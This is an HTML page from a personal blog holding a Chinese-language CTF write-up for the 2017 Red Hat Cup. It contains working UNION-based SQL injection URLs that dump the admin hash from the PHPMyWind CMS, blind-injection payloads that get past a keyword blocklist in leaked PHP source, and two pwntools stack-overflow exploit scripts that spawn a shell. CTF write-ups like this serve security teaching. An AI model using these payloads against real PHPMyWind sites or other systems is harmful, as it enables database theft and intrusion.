@@ -1,0 +1,317 @@
+<!DOCTYPE html>
+<html>
+<head>
+  <meta charset="utf-8">
+  
+
+  
+  <title>红帽杯2017 writeup | Headwind&#39;s Blog</title>
+  <meta name="viewport" content="width=device-width, initial-scale=1, maximum-scale=1">
+  <meta name="description" content="brain(Y)brainfuck 刮刮乐.git泄漏106.75.67.7:3080/.git/ 后台提示是后台密码2017年某一天。。。直接20170505进去了。。。尴尬 PHPMyWIND通过一篇文章http://0day5.com/archives/1146/知道这个cms存在sql注入查数据库名： http://106.75.96.7:3089/shoppingcart.php?a=a">
+<meta name="keywords" content="CTF">
+<meta property="og:type" content="article">
+<meta property="og:title" content="红帽杯2017 writeup">
+<meta property="og:url" content="http://h34dw1nd.github.io/2017/05/25/红帽杯2017-writeup/index.html">
+<meta property="og:site_name" content="Headwind&#39;s Blog">
+<meta property="og:description" content="brain(Y)brainfuck 刮刮乐.git泄漏106.75.67.7:3080/.git/ 后台提示是后台密码2017年某一天。。。直接20170505进去了。。。尴尬 PHPMyWIND通过一篇文章http://0day5.com/archives/1146/知道这个cms存在sql注入查数据库名： http://106.75.96.7:3089/shoppingcart.php?a=a">
+<meta property="og:updated_time" content="2017-12-18T13:45:56.021Z">
+<meta name="twitter:card" content="summary">
+<meta name="twitter:title" content="红帽杯2017 writeup">
+<meta name="twitter:description" content="brain(Y)brainfuck 刮刮乐.git泄漏106.75.67.7:3080/.git/ 后台提示是后台密码2017年某一天。。。直接20170505进去了。。。尴尬 PHPMyWIND通过一篇文章http://0day5.com/archives/1146/知道这个cms存在sql注入查数据库名： http://106.75.96.7:3089/shoppingcart.php?a=a">
+  
+    <link rel="alternate" href="/atom.xml" title="Headwind&#39;s Blog" type="application/atom+xml">
+  
+  
+    <link rel="icon" href="/favicon.png">
+  
+  
+    <link href="//fonts.googleapis.com/css?family=Source+Code+Pro" rel="stylesheet" type="text/css">
+  
+  <link rel="stylesheet" href="/css/style.css">
+</head>
+
+<body>
+  <div id="container">
+    <div id="wrap">
+      <header id="header">
+  <div id="banner"></div>
+  <div id="header-outer" class="outer">
+    <div id="header-title" class="inner">
+      <h1 id="logo-wrap">
+        <a href="/" id="logo">Headwind&#39;s Blog</a>
+      </h1>
+      
+    </div>
+    <div id="header-inner" class="inner">
+      <nav id="main-nav">
+        <a id="main-nav-toggle" class="nav-icon"></a>
+        
+          <a class="main-nav-link" href="/">Home</a>
+        
+          <a class="main-nav-link" href="/archives">Archives</a>
+        
+      </nav>
+      <nav id="sub-nav">
+        
+          <a id="nav-rss-link" class="nav-icon" href="/atom.xml" title="RSS Feed"></a>
+        
+        <a id="nav-search-btn" class="nav-icon" title="Suche"></a>
+      </nav>
+      <div id="search-form-wrap">
+        <form action="//google.com/search" method="get" accept-charset="UTF-8" class="search-form"><input type="search" name="q" class="search-form-input" placeholder="Search"><button type="submit" class="search-form-submit">&#xF002;</button><input type="hidden" name="sitesearch" value="http://h34dw1nd.github.io"></form>
+      </div>
+    </div>
+  </div>
+</header>
+      <div class="outer">
+        <section id="main"><article id="post-红帽杯2017-writeup" class="article article-type-post" itemscope itemprop="blogPost">
+  <div class="article-meta">
+    <a href="/2017/05/25/红帽杯2017-writeup/" class="article-date">
+  <time datetime="2017-05-24T16:11:58.000Z" itemprop="datePublished">2017-05-25</time>
+</a>
+    
+  </div>
+  <div class="article-inner">
+    
+    
+      <header class="article-header">
+        
+  
+    <h1 class="article-title" itemprop="name">
+      红帽杯2017 writeup
+    </h1>
+  
+
+      </header>
+    
+    <div class="article-entry" itemprop="articleBody">
+      
+        <h2 id="brain-Y"><a href="#brain-Y" class="headerlink" title="brain(Y)"></a>brain(Y)</h2><p>brainfuck</p>
+<h2 id="刮刮乐"><a href="#刮刮乐" class="headerlink" title="刮刮乐"></a>刮刮乐</h2><p>.git泄漏<br>106.75.67.7:3080/.git/</p>
+<h2 id="后台"><a href="#后台" class="headerlink" title="后台"></a>后台</h2><p>提示是后台密码2017年某一天。。。直接20170505进去了。。。尴尬</p>
+<h2 id="PHPMyWIND"><a href="#PHPMyWIND" class="headerlink" title="PHPMyWIND"></a>PHPMyWIND</h2><p>通过一篇文章<a href="http://0day5.com/archives/1146/知道这个cms存在sql注入" target="_blank" rel="noopener">http://0day5.com/archives/1146/知道这个cms存在sql注入</a><br>查数据库名：</p>
+<pre><code>http://106.75.96.7:3089/shoppingcart.php?a=addshopingcart&amp;typeid=10&amp;goodsid=1 and @`&apos;` /*!50000union*/ select null,null,null,null,null,null,null,null,null,null,SCHEMA_NAME,null,null,null,null,null,null,null,null,null,null,null,null,null,null,null,null,null,null,null,null,null,null,null,null,null,null,null from information_schema.SCHEMATA  limit 0,1 --+or @`&apos;` &amp;buynum=1&amp;attrid_1=%E9%BB%91%E8%89%B2&amp;attrid_2=WCDMA
+</code></pre><p>查表名：</p>
+<pre><code>http://106.75.96.7:3089/shoppingcart.php?a=addshopingcart&amp;typeid=10&amp;goodsid=1 and @`&apos;` /*!50000union*/ select null,null,null,null,null,null,null,null,null,null,TABLE_NAME,null,null,null,null,null,null,null,null,null,null,null,null,null,null,null,null,null,null,null,null,null,null,null,null,null,null,null from information_schema.TABLES where TABLE_SCHEMA=0x7068706d7977696e645f6462 limit 0,1 --+or @`&apos;` &amp;buynum=1&amp;attrid_1=%E9%BB%91%E8%89%B2&amp;attrid_2=WCDMA
+</code></pre><p>查列名：</p>
+<pre><code>http://106.75.96.7:3089/shoppingcart.php?a=addshopingcart&amp;typeid=10&amp;goodsid=1 and @`&apos;` /*!50000union*/ select null,null,null,null,null,null,null,null,null,null,COLUMN_NAME,null,null,null,null,null,null,null,null,null,null,null,null,null,null,null,null,null,null,null,null,null,null,null,null,null,null,null from information_schema.COLUMNS where TABLE_NAME=0x706d775f61646d696e limit 0,1 --+or @`&apos;` &amp;buynum=1&amp;attrid_1=%E9%BB%91%E8%89%B2&amp;attrid_2=WCDMA
+</code></pre><p>查admin的帐号密码的hash：</p>
+<pre><code>http://106.75.96.7:3089/shoppingcart.php?a=addshopingcart&amp;typeid=10&amp;goodsid=1 and @`&apos;` /*!50000union*/ select null,null,null,null,null,null,null,null,null,null,password,null,null,null,null,null,null,null,null,null,null,null,null,null,null,null,null,null,null,null,null,null,null,null,null,null,null,null from pmw_admin  limit 0,1 --+or @`&apos;` &amp;buynum=1&amp;attrid_1=%E9%BB%91%E8%89%B2&amp;attrid_2=WCDMA
+</code></pre><p>登录后台在在模版文件那里可以看到flag文件</p>
+<h2 id="thinkseeker"><a href="#thinkseeker" class="headerlink" title="thinkseeker"></a>thinkseeker</h2><p><a href="http://106.75.117.4:3083/index.php~" target="_blank" rel="noopener">http://106.75.117.4:3083/index.php~</a> ，存在备份文件源码泄露：</p>
+<pre><code>&lt;?php
+error_reporting(0);
+$token=&quot;e00cf25ad42683b3df678c61f42c6bda&quot;;
+
+foreach($_GET as $key=&gt;$value){ 
+    if (is_array($value)){
+        die(&quot;Bad input!&quot;);
+    }
+    $p=&quot;and|union|where|join|sleep|benchmark|if|sleep|benchmark|,| |\&apos;|\&quot;&quot;;
+    if(preg_match(&quot;/&quot;.$p.&quot;/is&quot;,$value)==1){
+        die(&quot;inj code!&quot;);
+    }
+}
+
+parse_str($_SERVER[&apos;QUERY_STRING&apos;]);
+
+if($token==md5(&quot;admin&quot;)){
+    $link=@mysql_connect(&quot;XXXX&quot;,&quot;XXXX&quot;,&quot;XXXX&quot;);
+    mysql_select_db(&quot;XXXX&quot;,$link);
+    $sql=&quot;select * from user where userid = &quot;.$userid;
+    $query = mysql_query($sql);
+    if (mysql_num_rows($query) == 1) { 
+        $arr = mysql_fetch_array($query);
+        if($arr[&apos;password&apos;] == $password) {
+            $sql=&quot;select * from info where infoid=&quot;.$infoid;
+            $result=mysql_query($sql);
+            $arr = mysql_fetch_array($result);
+            if(empty($arr[&apos;content&apos;])){
+                echo &quot;error sql!&quot;;
+            }else{
+                echo $arr[&apos;content&apos;];
+            }
+        }else{
+            echo &quot;error password!&quot;;
+        }
+    }else{
+        echo &quot;error userid!&quot;;
+    }
+    mysql_close($link);
+}else{
+    echo &quot;Bad token!&quot;;
+}
+?&gt;
+&lt;html&gt;
+    &lt;head&gt;
+        &lt;title&gt;web-test&lt;/title&gt;
+    &lt;/head&gt;
+    &lt;body&gt;
+        &lt;form action=&quot;&quot; method=&quot;get&quot;&gt;
+            User ID:&lt;input type=&quot;text&quot; name=&quot;userid&quot; length=&quot;50&quot; /&gt;&lt;br&gt;
+            Password:&lt;input type=&quot;password&quot; name=&quot;password&quot; length=&quot;50&quot; /&gt;&lt;br&gt;
+            &lt;input type=&quot;submit&quot; value=&quot;submit&quot;/&gt;
+        &lt;/form&gt;
+    &lt;/body&gt;
+&lt;/html&gt;
+</code></pre><p>可以看到需要确定的几个参数为token、password、userid、infoid<br>token值为：<br>md5(“admin”)== 21232f297a57a5a743894a0e4a801fc3<br>尝试userid=1，发现正确<br>构造payload查password：</p>
+<pre><code>http://106.75.117.4:3083/?userid=1%%26%%26ascii(mid(password/**/from/**/%s/**/for/**/1))=%s&amp;password=1&amp;token=21232f297a57a5a743894a0e4a801fc3&amp;infoid=
+</code></pre><p>盲注脚本跑一发<br>猜测infoid为1，正确<br>构造payload查flag：</p>
+<pre><code>http://106.75.117.4:3083/?userid=1%%26%%26ascii(mid((select/**/flag/**/from/**/flag)/**/from/**/%s/**/for/**/1))=%s&amp;password=219d03ad2d752ad2806ea1de18613158&amp;token=21232f297a57a5a743894a0e4a801fc3&amp;infoid=1
+</code></pre><p>盲注脚本跑一发</p>
+<h2 id="pwn1"><a href="#pwn1" class="headerlink" title="pwn1"></a>pwn1</h2><p>简单的栈溢出，构造一个ROP即可<br>exp</p>
+<pre><code>from pwn import *
+e=ELF(&apos;./pwn1_c1d0173e20a08feff046c8433f53fd37&apos;)
+p=remote(&apos;106.75.93.221&apos;,10000)
+sys_addr=p32(e.symbols[&apos;system&apos;])
+ret_addr=&apos;\x12\x12\x12\x12&apos;
+payload=&apos;A&apos;*52+sys_addr+ret_addr+p32(e.search(&apos;sh&apos;).next())
+p.sendline(payload)
+p.interactive()
+p.close()
+</code></pre><h2 id="pwn5"><a href="#pwn5" class="headerlink" title="pwn5"></a>pwn5</h2><p>也是简单的栈溢出（只会做栈溢出。。【捂脸】）<br>但是开了cananry<br>但显然flag已经被读入了内存。当_stack_check_fail时，会打印出当前程序的名称，只需要用flag地址覆盖argv[0]的地址即可。<br>exp</p>
+<pre><code>from pwn import *
+e=ELF(&apos;./pwnsss_d1b5b1011fc0ef9b3de9cb0ad261295a&apos;)
+p=remote(&apos;106.75.93.221&apos;,10003)
+payload=&apos;A&apos;*292+p32(0x804a080)
+p.sendline(payload)
+p.interactive()
+p.close()
+</code></pre>
+      
+    </div>
+    <footer class="article-footer">
+      <a data-url="http://h34dw1nd.github.io/2017/05/25/红帽杯2017-writeup/" data-id="cjbc9l1h8000hukvk1frzwc5t" class="article-share-link">Teilen</a>
+      
+      
+  <ul class="article-tag-list"><li class="article-tag-list-item"><a class="article-tag-list-link" href="/tags/CTF/">CTF</a></li></ul>
+
+    </footer>
+  </div>
+  
+    
+<nav id="article-nav">
+  
+    <a href="/2017/05/25/红帽杯线下赛总结/" id="article-nav-newer" class="article-nav-link-wrap">
+      <strong class="article-nav-caption">Neuer</strong>
+      <div class="article-nav-title">
+        
+          红帽杯线下赛总结
+        
+      </div>
+    </a>
+  
+  
+    <a href="/2017/03/22/0ctf2017-web-writeup/" id="article-nav-older" class="article-nav-link-wrap">
+      <strong class="article-nav-caption">Älter</strong>
+      <div class="article-nav-title">0ctf2017-web-writeup</div>
+    </a>
+  
+</nav>
+
+  
+</article>
+
+</section>
+        
+          <aside id="sidebar">
+  
+    
+
+  
+    
+  <div class="widget-wrap">
+    <h3 class="widget-title">Tags</h3>
+    <div class="widget">
+      <ul class="tag-list"><li class="tag-list-item"><a class="tag-list-link" href="/tags/CTF/">CTF</a></li><li class="tag-list-item"><a class="tag-list-link" href="/tags/Python/">Python</a></li><li class="tag-list-item"><a class="tag-list-link" href="/tags/漏洞分析/">漏洞分析</a></li><li class="tag-list-item"><a class="tag-list-link" href="/tags/瞎写/">瞎写</a></li></ul>
+    </div>
+  </div>
+
+
+  
+    
+  <div class="widget-wrap">
+    <h3 class="widget-title">Tag Cloud</h3>
+    <div class="widget tagcloud">
+      <a href="/tags/CTF/" style="font-size: 20px;">CTF</a> <a href="/tags/Python/" style="font-size: 15px;">Python</a> <a href="/tags/漏洞分析/" style="font-size: 10px;">漏洞分析</a> <a href="/tags/瞎写/" style="font-size: 10px;">瞎写</a>
+    </div>
+  </div>
+
+  
+    
+  <div class="widget-wrap">
+    <h3 class="widget-title">Archiv</h3>
+    <div class="widget">
+      <ul class="archive-list"><li class="archive-list-item"><a class="archive-list-link" href="/archives/2017/12/">December 2017</a></li><li class="archive-list-item"><a class="archive-list-link" href="/archives/2017/09/">September 2017</a></li><li class="archive-list-item"><a class="archive-list-link" href="/archives/2017/07/">July 2017</a></li><li class="archive-list-item"><a class="archive-list-link" href="/archives/2017/06/">June 2017</a></li><li class="archive-list-item"><a class="archive-list-link" href="/archives/2017/05/">May 2017</a></li><li class="archive-list-item"><a class="archive-list-link" href="/archives/2017/03/">March 2017</a></li><li class="archive-list-item"><a class="archive-list-link" href="/archives/2017/01/">January 2017</a></li></ul>
+    </div>
+  </div>
+
+
+  
+    
+  <div class="widget-wrap">
+    <h3 class="widget-title">letzter Beitrag</h3>
+    <div class="widget">
+      <ul>
+        
+          <li>
+            <a href="/2017/12/18/Windosw环境下安装Z3约束求解器并使用Python-Binding/">Windosw环境下安装Z3约束求解器并使用Python Binding</a>
+          </li>
+        
+          <li>
+            <a href="/2017/09/07/struts2-S2-052-复现及分析/">struts2 S2-052 复现及分析</a>
+          </li>
+        
+          <li>
+            <a href="/2017/07/16/CTFd-Flask-使用flask-migrate迁移数据库/">CTFd--Flask--使用flask-migrate迁移数据库</a>
+          </li>
+        
+          <li>
+            <a href="/2017/07/16/CTFd-发邮件的坑/">CTFd--发邮件的坑</a>
+          </li>
+        
+          <li>
+            <a href="/2017/07/12/第十届全国大学生信息安全竞赛-部分web-writeup/">第十届全国大学生信息安全竞赛 部分web-writeup</a>
+          </li>
+        
+      </ul>
+    </div>
+  </div>
+
+  
+</aside>
+        
+      </div>
+      <footer id="footer">
+  
+  <div class="outer">
+    <div id="footer-info" class="inner">
+      &copy; 2017 Headwind<br>
+      Powered by <a href="http://hexo.io/" target="_blank">Hexo</a>
+    </div>
+  </div>
+</footer>
+    </div>
+    <nav id="mobile-nav">
+  
+    <a href="/" class="mobile-nav-link">Home</a>
+  
+    <a href="/archives" class="mobile-nav-link">Archives</a>
+  
+</nav>
+    
+
+<script src="//ajax.googleapis.com/ajax/libs/jquery/2.0.3/jquery.min.js"></script>
+
+
+  <link rel="stylesheet" href="/fancybox/jquery.fancybox.css">
+  <script src="/fancybox/jquery.fancybox.pack.js"></script>
+
+
+<script src="/js/script.js"></script>
+
+
+
+  </div>
+</body>
+</html>
